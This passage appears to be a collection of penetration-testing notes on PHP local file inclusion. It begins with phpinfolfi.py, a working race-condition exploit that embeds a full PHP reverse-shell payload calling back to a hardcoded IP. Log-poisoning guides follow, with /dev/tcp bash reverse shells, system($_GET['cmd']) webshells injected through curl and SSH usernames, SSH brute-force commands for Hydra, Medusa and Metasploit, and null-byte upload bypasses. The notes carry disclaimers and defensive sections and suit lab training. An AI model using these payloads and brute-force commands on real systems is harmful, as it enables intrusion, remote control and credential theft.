- Use `disable_functions` in php.ini to block risky functions  \n✅ **Implement proper access controls** - Restrict access to sensitive endpoints\n\n---\n\n## 📚 References\n\n- [Insomnia Security - LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)\n- OWASP Testing Guide - File Inclusion Vulnerabilities\n- PHP Security Best Practices\n\n---\n\n## ⚠️ Legal Disclaimer\n\nThis documentation is for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security assessments.\n\n---\n\n*Document created for penetration testing education and awareness*\n\n\n\n# phpinfolfi.py\n#!/usr/bin/python\n# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf\n\nfrom __future__ import print_function\nimport sys\nimport threading\nimport socket\n\ndef setup(host, port):\n    TAG = \"Security Test\"\n    PAYLOAD = \"\"\"<?php\nset_time_limit(0);\n$VERSION = \"1.0\";\n$ip = '10.233.1.179';  // CHANGE THIS\n$port = 443;           // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n    \n    if ($pid) {\n        exit(0);\n    }\n    \n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\numask(0);\n\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n$descriptorspec = array(\n    0 => array(\"pipe\", \"r\"),\n    1 => array(\"pipe\", \"w\"),\n    2 => array(\"pipe\", \"w\")\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n    \n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n    \n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n    \n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n    \n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n    \n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\\\n\";\n    }\n}\n?>\"\"\"\n    \n    padding = \"A\" * 5000\n    \n    REQ1_DATA = \"\"\"-----------------------------7dbff1ded0714\\r\nContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r\nContent-Type: text/plain\\r\n\\r\n%s\n-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD\n    \n    REQ1 = \"\"\"POST /phpinfo.php?a=\"\"\" + padding + \"\"\" HTTP/1.1\\r\nCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\" + padding + \"\"\"\\r\nHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r\nHTTP_USER_AGENT: \"\"\" + padding + \"\"\"\\r\nHTTP_ACCEPT_LANGUAGE: \"\"\" + padding + \"\"\"\\r\nHTTP_PRAGMA: \"\"\" + padding + \"\"\"\\r\nContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r\nContent-Length: %s\\r\nHost: %s\\r\n\\r\n%s\"\"\" % (len(REQ1_DATA), host, REQ1_DATA)\n    \n    LFIREQ = \"\"\"GET /webpentest/local-file-inclusion-1.php?file=%s HTTP/1.1\\r\nUser-Agent: Mozilla/4.0\\r\nProxy-Connection: Keep-Alive\\r\nHost: %s\\r\n\\r\n\"\"\"\n    \n    return (REQ1, TAG, LFIREQ)\n\n\ndef phpinfoLFI(host, port, phpinforeq, offset, lfireq, tag):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    s.connect((host, port))\n    s2.connect((host, port))\n    \n    s.send(phpinforeq)\n    d = \"\"\n    \n    while len(d) < offset:\n        d += s.recv(offset)\n    \n    try:\n        i = d.index(\"[tmp_name] =&gt;\")\n        fn = d[i+17:i+31]\n    except ValueError:\n        return None\n    \n    s2.send(lfireq % (fn, host))\n    d = s2.recv(4096)\n    s.close()\n    s2.close()\n    \n    if d.find(tag) != -1:\n        return fn\n\n\nclass ThreadWorker(threading.Thread):\n    def __init__(self, e, l, m, *args):\n        threading.Thread.__init__(self)\n        self.event = e\n        self.lock = l\n        self.maxattempts = m\n        self.args = args\n        \n    def run(self):\n        global counter\n        while not self.event.is_set():\n            with self.lock:\n                if counter >= self.maxattempts:\n                    return\n                counter += 1\n            \n            try:\n                x = phpinfoLFI(*self.args)\n                if self.event.is_set():\n                    break\n                if x:\n                    print(\"\\nGot it! Shell uploaded to %s\" % x)\n                    self.event.set()\n            except socket.error:\n                return\n\n\ndef getOffset(host, port, phpinforeq):\n    \"\"\"Gets offset of tmp_name in the php output\"\"\"\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(phpinforeq)\n    \n    d = \"\"\n    while True:\n        i = s.recv(4096)\n        d += i\n        if i == \"\":\n            break\n        if i.endswith(\"0\\r\\n\\r\\n\"):\n            break\n    \n    s.close()\n    i = d.find(\"[tmp_name] =&gt;\")\n    if i == -1:\n        raise ValueError(\"No php tmp_name in phpinfo output\")\n    \n    print(\"found %s at %s\" % (d[i:i+10], i))\n    return i + 256\n\n\ndef main():\n    print(\"LFI With PHPInfo()\")\n    print(\"-=\" * 30)\n    \n    if len(sys.argv) < 2:\n        print(\"Usage: %s host [port] [threads]\" % sys.argv[0])\n        sys.exit(1)\n    \n    try:\n        host = socket.gethostbyname(sys.argv[1])\n    except socket.error as e:\n        print(\"Error with hostname %s: %s\" % (sys.argv[1], e))\n        sys.exit(1)\n    \n    port = 80\n    try:\n        port = int(sys.argv[2])\n    except IndexError:\n        pass\n    except ValueError as e:\n        print(\"Error with port %d: %s\" % (sys.argv[2], e))\n        sys.exit(1)\n    \n    poolsize = 10\n    try:\n        poolsize = int(sys.argv[3])\n    except IndexError:\n        pass\n    except ValueError as e:\n        print(\"Error with poolsize %d: %s\" % (sys.argv[3], e))\n        sys.exit(1)\n    \n    print(\"Getting initial offset...\")\n    reqphp, tag, reqlfi = setup(host, port)\n    offset = getOffset(host, port, reqphp)\n    sys.stdout.flush()\n    \n    maxattempts = 1000\n    e = threading.Event()\n    l = threading.Lock()\n    \n    print(\"Spawning worker pool (%d)...\" % poolsize)\n    sys.stdout.flush()\n    \n    tp = []\n    for i in range(0, poolsize):\n        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))\n    \n    for t in tp:\n        t.start()\n    \n    try:\n        global counter\n        counter = 0\n        while not e.wait(1):\n            if e.is_set():\n                break\n            with l:\n                sys.stdout.write(\"\\r% %d / % %d\" % (counter, maxattempts))\n                sys.stdout.flush()\n                if counter >= maxattempts:\n                    break\n        print()\n        if e.is_set():\n            print(\"WOOT! \\\\o/\")\n        else:\n            print(\":-(\")\n    except KeyboardInterrupt:\n        print(\"\\nShuttin' down...\")\n        e.set()\n    \n    print(\"Shuttin' down...\")\n    for t in tp:\n        t.join()\n\n\nif __name__ == \"__main__\":\n    counter = 0\n    main()"}, {"name": "log posining through ssh", "content": "# 🔥 Log Poisoning Attack - Complete Guide\n\n## 📋 Table of Contents\n\n- [Overview](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#overview)\n- [Vulnerable Code Analysis](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#vulnerable-code-analysis)\n- [Attack Payloads](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#attack-payloads)\n- [Exploitation URLs](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#exploitation-urls)\n- [Log Poisoning Vectors](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#log-poisoning-vectors)\n- [SSH Log Poisoning Setup](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#ssh-log-poisoning-setup)\n- [Metasploit SSH Tools Installation](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#metasploit-ssh-tools-installation)\n- [Verification](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#verification)\n\n---\n\n## 🎯 Overview\n\nLog Poisoning is a technique where an attacker injects malicious code into log files that are later processed by a vulnerable application through Local File Inclusion (LFI). This can lead to Remote Code Execution (RCE).\n\n---\n\n## 💻 Vulnerable Code Analysis\n\n### 📄 local-file-inclusion-4.php\n\nThe vulnerable application writes request information to a log file and allows file inclusion:\n\n```php\n<?php\ndate_default_timezone_set('Asia/Kolkata');\n\nfunction getRealIpAddr() {\n    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {\n        return $_SERVER['HTTP_CLIENT_IP'];\n    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];\n    } else {\n        return $_SERVER['REMOTE_ADDR'];\n    }\n}\n\n$realIp = getRealIpAddr();\n$remoteIp = $_SERVER['REMOTE_ADDR'];\n$uri = $_SERVER['REQUEST_URI'] ?? 'Unknown';\n$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct Access / Unknown';\n$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';\n$dateTime = date(\"Y-m-d H:i:s T\");\n\n$logEntry = <<<LOG\n<hr>\n<b>Date:</b> $dateTime<br>\n<b>IP (REMOTE_ADDR):</b> $remoteIp<br>\n<b>IP (Detected):</b> $realIp<br>\n<b>Page:</b> $uri<br>\n<b>Referrer:</b> $referrer<br>\n<b>User-Agent:</b> $userAgent<br>\nLOG;\n\nfile_put_contents(\"log/log.html\", $logEntry . PHP_EOL, FILE_APPEND | LOCK_EX);\n\nif (isset($_REQUEST[\"file\"])) {\n    $local_file = \"log/\" . $_REQUEST[\"file\"] . \".html\";\n    include($local_file);\n}\n?>\n```\n\n**⚠️ Vulnerability:** The `$userAgent` variable is directly written to the log file without sanitization, and the log file can be included via the `file` parameter.\n\n---\n\n## 🎯 Attack Payloads\n\n### 1️⃣ Basic Command Execution Test\n\n```php\n<?php system('bash -l >& /dev/tcp/192.168.1.7/443 0>&1'); ?>\n```\n\n### 2️⃣ Using GET Parameter for Commands\n\n```php\n<?php echo system($_GET['cmd']); ?>\n```\n\n### 3️⃣ Direct Bash Reverse Shell\n\n```php\n<?php /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1' ?>\n```\n\n---\n\n## 🔗 Exploitation URLs\n\nReplace the file path and LFI parameter as needed:\n\n### 🔍 Basic Log Access\n\n```\nhttp://192.168.1.31/web-pentest/local-file-inclusion-4.php?file=log&cmd=uname-a\n```\n\n### 🔍 Command Injection via GET\n\n```\nhttp://192.168.1.31/web-pentest/local-file-inclusion-4.php?file=log&cmd=id\n```\n\n### 🔍 Configuration File Access\n\n```\nhttp://192.168.1.31/web-pentest/local-file-inclusion-4.php?file=log&cmd=ifconfig\n```\n\n---\n\n## 📝 Other Log Poisoning Vectors\n\n### 🌐 Nginx\n\n**Log Location:** `/var/log/nginx/access.log`\n\n**Payload Injection:**\n\n```bash\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://target.com\n```\n\n### 🔐 VSFTPD\n\n**Log Location:** `/var/log/vsftpd.log`\n\n**Technique:** Login with a crafted username containing PHP code\n\n### 🔑 SSH\n\n**Log Location:** `/var/log/auth.log`\n\n**Technique:** Log in using a username like:\n\n```bash\nssh '<?php system($_GET[\"cmd\"]); ?>'@target\n```\n\n---\n\n## 🔐 SSH Log Poisoning Setup\n\n### 📦 Install and Configure rsyslog on Debian/Ubuntu\n\n#### Update package lists:\n\n```bash\napt update\n```\n\n#### Install rsyslog:\n\n```bash\napt install rsyslog -y\n```\n\n#### Enable and start the service:\n\n```bash\nsystemctl enable rsyslog\nsystemctl start rsyslog\nsystemctl status rsyslog\n```\n\n---\n\n## ⚙️ Configuration for SSH Logging\n\n### 📂 Config Files\n\n- **Main config:** `/etc/rsyslog.conf`\n- **Extra configs:** `/etc/rsyslog.d/`\n\n### 🔧 Default Behavior\n\nAuthentication logs (including SSH) go to:\n\n```\n/var/log/auth.log\n```\n\n### ✅ Check Default Auth Settings\n\nIn `/etc/rsyslog.d/50-default.conf`, ensure this line exists:\n\n```bash\nauth,authpriv.*    /var/log/auth.log\n```\n\n---\n\n## 🎨 Custom SSH Logging (Optional)\n\nTo create a dedicated SSH log file:\n\n#### Edit configuration:\n\n```bash\nvim /etc/rsyslog.d/sshd.conf\n```\n\n#### Add:\n\n```bash\nif $programname == 'sshd' then /var/log/sshd.log\n& stop\n```\n\n---\n\n## 🔄 Apply Changes\n\nRestart rsyslog:\n\n```bash\nsystemctl restart rsyslog\n```\n\n---\n\n## ✅ Verification\n\n### Check if logs are being written:\n\n```bash\ntail -f /var/log/auth.log\n```\n\n### If custom file configured:\n\n```bash\ntail -f /var/log/sshd.log\n```\n\n**📌 Note:** You should see SSH login attempts (successful and failed) logged in real-time.\n\n---\n\n## 🚀 Metasploit SSH Tools Installation (Kali Linux)\n\n### 📦 Update System\n\n```bash\nsudo apt update && sudo apt upgrade -y\n```\n\n### 🔧 Install Metasploit Framework\n\n```bash\nsudo apt install metasploit-framework -y\n```\n\n### 🎯 Install SSH Auxiliary Tools\n\nMetasploit comes with built-in SSH modules. Verify installation:\n\n```bash\nmsfconsole\n```\n\nInside Metasploit console:\n\n```bash\nsearch ssh\n```\n\n### 🔑 Common SSH Modules in Metasploit\n\n#### 1. SSH Login Scanner\n\n```bash\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS target_ip\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n```\n\n#### 2. SSH Version Scanner\n\n```bash\nuse auxiliary/scanner/ssh/ssh_version\nset RHOSTS target_ip\nrun\n```\n\n#### 3. SSH User Enumeration\n\n```bash\nuse auxiliary/scanner/ssh/ssh_enumusers\nset RHOSTS target_ip\nset USER_FILE /usr/share/wordlists/metasploit/unix_users.txt\nrun\n```\n\n### 📚 Additional SSH Tools Installation\n\n#### Install Hydra (SSH Brute Force)\n\n```bash\nsudo apt install hydra -y\n```\n\n**Usage:**\n\n```bash\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target_ip\n```\n\n#### Install Medusa\n\n```bash\nsudo apt install medusa -y\n```\n\n**Usage:**\n\n```bash\nmedusa -h target_ip -u root -P /usr/share/wordlists/rockyou.txt -M ssh\n```\n\n#### Install Ncrack\n\n```bash\nsudo apt install ncrack -y\n```\n\n**Usage:**\n\n```bash\nncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt target_ip\n```\n\n---\n\n## 🎪 Inject PHP Code with SSH\n\nAfter setting up SSH logging, inject the payload:\n\n```bash\nssh '<?php system($_GET[\"cmd\"]); ?>'@target\n```\n\n### 🔍 After the injection, use LFI:\n\n```bash\nhttp://target/vuln.php?file=/var/log/auth.log&cmd=id\n```\n\n---\n\n## 🛡️ Defense Mechanisms\n\n1. **Input Validation** - Sanitize all user inputs\n2. **Whitelist File Inclusion** - Only allow specific files\n3. **Disable Dangerous Functions** - Add to `php.ini`:\n    \n    ```ini\n    disable_functions = exec,passthru,shell_exec,system,proc_open,popen\n    ```\n    \n4. **Log File Permissions** - Restrict web server access to logs\n5. **Web Application Firewall (WAF)** - Detect malicious patterns\n6. **Least Privilege Principle** - Run web services with minimal permissions\n\n---\n\n## ⚠️ Legal Disclaimer\n\n**This guide is for educational and authorized penetration testing purposes only.**\n\n- Only test systems you own or have explicit permission to test\n- Unauthorized access to computer systems is illegal\n- Always follow responsible disclosure practices\n- Use this knowledge ethically and legally\n\n---\n\n## 📚 References\n\n- OWASP LFI Guide\n- PortSwigger Web Security Academy\n- HackTricks - Log Poisoning\n- Metasploit Unleashed\n\n---\n\n## 🏆 Summary\n\nLog Poisoning combined with LFI is a powerful attack vector that can lead to full system compromise. Understanding this technique helps security professionals:\n\n- Identify vulnerable applications\n- Implement proper input validation\n- Secure log file access\n- Design better security architectures\n\n**Remember:** With great power comes great responsibility. Use wisely! 🎯\n\n---\n\n**Created for:** Web Application Penetration Testing  \n**Environment:** Kali Linux / Debian / Ubuntu  \n**Target:** Educational Lab Environment"}, {"name": "null byte injection", "content": "# 🎯 NULL-BYTE INJECTION VULNERABILITY\n\n---\n\n## 📚 What is Null-Byte Injection?\n\n**Null-byte injection** is an input-validation attack where an attacker inserts a **NUL character**  \n(`\\0`, `%00`, `\\x00`) into user-controlled data.\n\n💡 The trick works because:\n\n- **Lower-level / native code (C/C++)** treats `\\0` as **end of string**\n- **Higher-level code (PHP, Java, Python, etc.)** may still process the **full string**\n\nThis mismatch can be abused to **bypass security checks** such as:\n- File extension validation  \n- Path restrictions  \n- Upload filtering  \n\n---\n\n## ⚙️ How It Works\n\nMany system-level APIs are written in **C/C++**, which use **NUL-terminated strings**.\n\n### Typical flow:\n1. Application validates or modifies input (e.g., appends `.php`)\n2. Input is passed to a **native API**\n3. Native layer **truncates input at `\\0`**\n4. Validation is silently bypassed 🚨\n\n### Example:\n```text\nInput: shell.php%00.jpg\nPHP sees: shell.php%00.jpg\nC library sees: shell.php\n\n\n---\n\n## 🛡️ Is This Still a Problem Today?\n\n### ✅ Modern PHP (7.x / 8.x)\n\n- PHP strings are **binary-safe**\n    \n- Core truncation bugs were fixed around **PHP 5.3.4**\n    \n\n### ⚠️ Still risky when:\n\n- PHP interacts with **native extensions / FFI**\n    \n- Web servers or proxies mishandle `%00`\n    \n- **Old or unpatched modules** are used\n    \n- File upload parsers treat metadata differently than content\n    \n\n🔐 **Conclusion:**\n\n> Modern runtimes reduce the risk — but **defense in depth is still required**\n\n---\n\n## 🎯 Typical Attack Examples\n\n- **Extension bypass**\n    \n    `secret_config%00.txt  → opens secret_config`\n    \n- **Malicious upload**\n    \n    `webshell.php%00.pdf`\n    \n- **Native command truncation**\n    \n    `argument%00--dangerous-flag`\n    \n\n---\n\n## 🧪 How to Test Safely (Lab / Controlled)\n\n⚠️ **Test only on systems you own or are authorized to test**\n\n### Testing ideas:\n\n- Inject `%00` or `\\0` into:\n    \n    - Query strings\n        \n    - POST data\n        \n    - Headers\n        \n    - Cookies\n        \n- Multipart upload filename abuse:\n    \n    `curl -F \"file=@poc.php;filename=poc.php%00.pdf\" http://target/upload`\n    \n- Unit tests that assert **NUL input is rejected**\n    \n\n---\n\n## 🔒 Practical Mitigations (Priority Order)\n\n### ✅ Best Practices\n\n1. **Reject NUL bytes early**\n    \n    `if (strpos($input, \"\\0\") !== false) reject();`\n    \n2. **Canonicalize paths**\n    \n    - Use `realpath()`\n        \n    - Ensure file stays inside allowed directories\n        \n3. **Never append extensions to user input**\n    \n    - Use allowlists instead\n        \n4. **Validate uploads by content**\n    \n    - Magic bytes / MIME detection\n        \n5. **Avoid passing raw input to native code**\n    \n    - Use safe APIs & parameterized calls\n        \n6. **Keep everything updated**\n    \n    - PHP, web server, extensions\n        \n7. **WAF rules**\n    \n    - Helpful, but never sufficient alone\n        \n\n---\n\n## 💻 PHP Code Examples\n\n### ❌ Vulnerable Pattern (DON'T USE)\n\n`<?php $page = $_GET['page'];     // attacker controls input $page = $page . '.php';    // naive append include __DIR__ . '/pages/' . $page;`\n\n---\n\n### ✅ Safe Pattern (Allowlist)\n\n`<?php $allowed = [     'home'  => 'pages/home.php',     'about' => 'pages/about.php' ];  $key = $_GET['page'] ?? 'home';  if (strpos($key, \"\\0\") !== false || !isset($allowed[$key])) {     http_response_code(400);     exit('Invalid page'); }  include __DIR__ . '/' . $allowed[$key];`\n\n---\n\n### ✅ Reject NULs Early\n\n`<?php $input = $_GET['file'] ?? '';  if (strpos($input, \"\\0\") !== false) {     http_response_code(400);     exit('Invalid input'); }`\n\n---\n\n## 🐝 bee-box Example Setup\n\n`# SSH into bee-box ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.1.205  # Create directories mkdir uploads pages chown -R www-data:www-data /var/www/uploads  # View vulnerable file vim null-byte-injection.php`\n\n---\n\n## 🌐 Local File Inclusion (Demo)\n\n`<!DOCTYPE html> <html> <head>     <meta charset=\"utf-8\">     <title>Local File Inclusion</title> </head> <body>     <h1>Local File Inclusion</h1>      <?php         if (isset($_REQUEST[\"file\"])) {             $filename = $_REQUEST['file'] . \".php\";             include($filename);         }     ?> </body> </html>`\n\n🚨 **Why vulnerable?**\n\n- Appends `.php`\n    \n- No validation\n    \n- Susceptible to `%00` truncation in unsafe environments"}, {"name": "portable server commands", "content": "## PHP Built-in Server\n\nbash\n\n```bash\n# HTTP (default port 8000)\nphp -S localhost:8000\n\n# HTTP (custom port)\nphp -S localhost:8080\n\n# Specify document root\nphp -S localhost:8000 -t /path/to/your/project\n\n# Listen on all interfaces\nphp -S 0.0.0.0:8000\n```\n\n**For HTTPS with PHP:** You need to set up a reverse proxy (like Nginx) or use a tunnel service like ngrok, as PHP's built-in server doesn't support HTTPS directly.\n\n## Python Built-in Server\n\nbash\n\n```bash\n# Python 3 - HTTP\npython -m http.server 8000\n\n# Python 3 - custom port\npython -m http.server 8080\n\n# Python 2 (legacy)\npython -m SimpleHTTPServer 8000\n```\n\n**For HTTPS with Python:**\n\nbash\n\n```bash\n# Create a simple HTTPS server (Python 3)\npython -m http.server 8000 --bind 0.0.0.0\n\n# Or use this script for HTTPS:\n```\n\npython\n\n```python\n#import http.server\nimport ssl\nimport socket\nimport os\n\nserver_address = ('0.0.0.0', 4443)\nhttpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)\n\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\ncontext.load_cert_chain(certfile='./cert.pem', keyfile='./key.pem')\n\nhttpd.socket = context.wrap_socket(httpd.socket, server_side=True)\n\n# Get real network IP\ndef get_local_ip():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect((\"8.8.8.8\", 80))\n        ip = s.getsockname()[0]\n        s.close()\n        return ip\n    except:\n        return \"Unable to determine\"\n\nlocal_ip = get_local_ip()\n\nprint(\"=\" * 50)\nprint(\"HTTPS Server Running!\")\nprint(\"=\" * 50)\nprint(f\"Local access:    https://localhost:4443\")\nprint(f\"Network access:  https://{local_ip}:4443\")\nprint(f\"Serving from:    {os.getcwd()}\")\nprint(\"=\" * 50)\nprint(\"Press Ctrl+C to stop\")\nprint(\"=\" * 50)\n\nhttpd.serve_forever()```\n\nGenerate self-signed certificate:\n\nbash\n\n```bash\nopenssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes\n```\n\n## FTP Server (Python)\n\n# Install from Kali repos\nsudo apt install python3-pyftpdlib\n\n# Then run\npython3 -m pyftpdlib -p 2121 -w\n- **Python**: [http://localhost:8000](http://localhost:8000)\n- **FTP**: ftp://localhost:21\n\nThese are lightweight development servers"}, {"name": "proc system", "content": "# 🧠 proc Filesystem Abuse in Web Exploitation\n### *Local File Inclusion (LFI) → Process Enumeration → Remote Code Execution (RCE)*\n\n---\n\n## 📁 What is `/proc`?\nThe **`/proc` filesystem** in Linux is a **virtual, kernel-generated filesystem**.  \nIt exposes **live system and process information** and is **not stored on disk**.\n\n> `/proc` is invaluable for administrators — and extremely useful for attackers  \n> when combined with **Local File Inclusion (LFI)** vulnerabilities.\n\n---\n\n## 🔑 Key `/proc` Files of Interest\n\n### 1️⃣ `/proc/self/environ`\n**📌 Content**\n- Environment variables of the current process  \n- Null-byte (`\\x00`) separated\n\n**⚔️ Offensive Use**\n- Inject payloads via HTTP headers (e.g., `User-Agent`)\n- Trigger execution through LFI inclusion\n\n**🛡️ Defensive Focus**\n- Sanitize logged headers\n- Monitor access to `/proc/self/environ`\n- Audit environment variables in web processes\n\n---\n\n### 2️⃣ `/proc/self/cmdline`\n**📌 Content**\n- Command-line arguments used to start the process\n\n**⚔️ Offensive Use**\n- Leak sensitive startup configs\n- Reveal credentials, paths, flags\n\n**🛡️ Defensive Focus**\n- Avoid secrets in CLI arguments\n- Use secure secret managers\n\n---\n\n### 3️⃣ `/proc/[PID]/fd/[FD]`\n**📌 Content**\n- File descriptors opened by a process  \n- Symlinks to files, sockets, pipes\n\n**⚔️ Offensive Use**\n- Locate active access logs\n- Abuse writable descriptors for log poisoning\n- Achieve LFI → RCE\n\n**🛡️ Defensive Focus**\n- Limit process file permissions\n- Monitor unusual reads of `/proc/*/fd/*`\n\n---\n\n## 🔥 LFI + PID = Remote Code Execution (RCE)\n\n### 🧩 Why This Works\n- LFI allows local file inclusion\n- `/proc` exposes **live, writable files**\n- Web servers keep logs **open via file descriptors**\n\n---\n\n## 🧪 Example Attack Flow (High-Level)\n\n### 🔹 Step 1: LFI Vulnerability Exists\n- Application includes files based on user input\n\n### 🔹 Step 2: Identify Web Server PID\n- Each process has a directory under `/proc/[PID]/`\n\n### 🔹 Step 3: Enumerate File Descriptors\n- Access `/proc/[PID]/fd/`\n- Identify access log symlink\n\n### 🔹 Step 4: Log Poisoning\n- Inject code via HTTP headers\n- Payload written into access logs\n\n### 🔹 Step 5: Trigger Inclusion\n- LFI includes the poisoned file descriptor\n- Payload executes in server context\n\n---\n\n## 🗺️ System-Wide Recon via `/proc`\n\n| Path | Information Exposed |\n|-----|--------------------|\n| `/proc/net/*` | Network connections |\n| `/proc/net/arp` | Local network hosts |\n| `/proc/net/tcp` | Active TCP sessions |\n| `/proc/version` | Kernel version |\n| `/proc/mounts` | Mounted filesystems |\n| `/proc/sched_debug` | Scheduler internals |\n\n> ⚠️ These paths assist in **lateral movement**, **container escapes**, and **kernel targeting**\n\n---\n\n## 🎯 Common `/proc` Targets in LFI Exploits\n\n| Path | Purpose |\n|----|----|\n| `/proc/self/environ` | Environment injection |\n| `/proc/self/cmdline` | Config leakage |\n| `/proc/[PID]/fd/[FD]` | Log file inclusion |\n| `/proc/net/tcp` | Network mapping |\n\n---\n\n## 🧠 Exploitation Summary\n\n- LFI alone is dangerous\n- `/proc` **amplifies impact**\n- Combining LFI + PID knowledge often leads to **RCE**\n- Dynamic files (logs, env, sockets) are prime targets\n\n---\n\n## 🛡️ Defensive Recommendations\n\n### 🔐 Web Application Hardening\n- Strict allow-lists for file inclusion\n- Disable dynamic includes where possible\n\n### 🔒 System Hardening\n- Restrict `/proc` visibility\n- Use AppArmor / SELinux\n- Containerize services securely\n\n### 👀 Detection & Monitoring\n- Alert on access to `/proc/*/fd/*`\n- Correlate LFI attempts with log anomalies\n- Monitor header injection patterns\n\n---\n\n## 📌 Key Takeaway\n> **LFI + `/proc` = One of the most reliable paths to RCE in Linux web environments**\n\nUnderstanding this chain is **critical for OSCP, real-world pentesting, and blue-team defense**.\n\n---\n\n🧑‍💻 *Educational reference for web application security testing*\n"}, {"name": "rc other ways through lfi", "content": "# 🔐 Local File Inclusion to Remote Code Execution - Complete Security Guide\n\n---\n\n## 📌 Table of Contents\n\n1. [Local File Inclusion (LFI) to Remote Code Execution (RCE) Techniques](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#lfi-to-rce)\n2. [File Upload Abuse](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#file-upload-abuse)\n3. [Real-World Abuse Scenarios](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#real-world-scenarios)\n4. [Defensive Strategy](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#defensive-strategy)\n5. [Secure PHP Upload Handler](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#secure-php-handler)\n6. [Server Configuration](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#server-configuration)\n7. [Testing & Operations](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#testing-operations)\n\n---\n\n## 🎯 Local File Inclusion (LFI) to Remote Code Execution (RCE) Techniques {#lfi-to-rce}\n\n> **Educational Purpose:** Local File Inclusion (LFI) vulnerabilities allow attackers to include files on a server, often leading to sensitive information disclosure or full Remote Code Execution (RCE) when combined with other techniques.\n\n### Common Techniques for LFI to RCE\n\n#### 1. 🔧 PHP Wrappers\n\n- **PHP wrappers** like `php://filter` and `php://input` can be used to read, modify, or execute files\n- Attackers use the `php://filter` wrapper to base64-encode PHP source files for information gathering\n- Wrappers like `zip://` can be abused by uploading specially crafted ZIP files containing malicious code, then including them via LFI for execution\n\n**Example:**\n\n```php\n// Reading PHP source code via LFI\n?page=php://filter/convert.base64-encode/resource=config.php\n\n// 